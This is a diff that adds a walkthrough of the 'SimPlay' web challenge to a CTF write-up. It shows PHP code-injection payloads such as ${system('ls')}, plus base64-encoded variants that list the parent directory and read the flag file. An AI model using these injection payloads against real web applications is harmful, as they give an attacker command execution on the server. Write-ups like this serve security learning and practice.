@@ -7,8 +7,16 @@ It was awesome ctf ,so let's enjoy with writeup.
 # web challenges:
 
 ## 1- SimPlay
+![Screenshot at 2021-11-25 19-26-09](https://user-images.githubusercontent.com/52857059/143482771-46d1f5ad-c4c8-4667-882a-6d2c23525010.png)
+After clicking the Try Again button :
 
+I try php code injection ${system('ls')}
 
+It works But I can't find flag file.
+let's try another payload with base64_decode function --> ${system(base64_decode(bHMgLi4v))}
+
+I got flag name :")
+next step , let's read flag file --> ${system(base64_decode(Y2F0IC4uL2ZsYWcq))}
 
 
 
